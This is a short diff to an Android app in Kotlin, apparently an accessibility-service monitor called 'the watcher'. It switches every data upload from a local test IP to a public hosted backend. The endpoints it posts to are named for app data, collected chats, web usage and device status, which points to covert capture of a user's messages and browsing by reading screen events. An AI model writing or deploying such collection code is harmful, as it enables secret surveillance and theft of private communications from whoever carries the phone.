@@ -204,7 +204,7 @@ if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
 
             val body    = json.toString().toRequestBody("application/json".toMediaType())
             val request = Request.Builder()
-                .url("http://192.168.18.163:8000/appdata/")
+                .url("https://the-watcher-backend.onrender.com/appdata/")
                 .post(body)
                 .build()
 
@@ -403,7 +403,7 @@ if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
 
                 val body    = json.toString().toRequestBody("application/json".toMediaType())
                 val request = Request.Builder()
-                    .url("http://192.168.18.163:8000/collectchat/")
+                    .url("https://the-watcher-backend.onrender.com/collectchat/")
                     .post(body)
                     .build()
 
@@ -480,7 +480,7 @@ if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
 
                 val body    = json.toString().toRequestBody("application/json".toMediaType())
                 val request = Request.Builder()
-                    .url("http://192.168.18.163:8000/collectchat/")
+                    .url("https://the-watcher-backend.onrender.com/collectchat/")
                     .post(body)
                     .build()
 
@@ -581,7 +581,7 @@ if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
 
                 val body    = json.toString().toRequestBody("application/json".toMediaType())
                 val request = Request.Builder()
-                    .url("http://192.168.18.163:8000/collectwebusage/")
+                    .url("https://the-watcher-backend.onrender.com/collectwebusage/")
                     .post(body)
                     .build()
 
@@ -612,7 +612,7 @@ private fun reportDeviceStatus(statusType: String) {
             val body = json.toString()
                 .toRequestBody("application/json".toMediaType())
             val request = Request.Builder()
-                .url("http://192.168.18.163:8000/report-device-status/")
+                .url("https://the-watcher-backend.onrender.com/report-device-status/")
                 .post(body)
                 .build()
             httpClient.newCall(request).execute().close()
